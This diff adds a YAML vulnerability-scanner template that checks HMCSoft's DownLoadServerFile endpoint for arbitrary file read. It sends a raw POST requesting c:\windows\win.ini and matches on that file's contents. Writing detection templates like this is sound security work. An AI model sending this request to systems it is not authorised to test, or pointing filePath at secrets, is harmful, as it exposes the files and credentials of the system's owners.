@@ -1,0 +1,29 @@
+id: poc-yaml-hmcsoft-downloadserverfile-anyfile-read
+info:
+  name: HMCSoft DownLoadServerFile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        filePath=c:\windows\win.ini
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
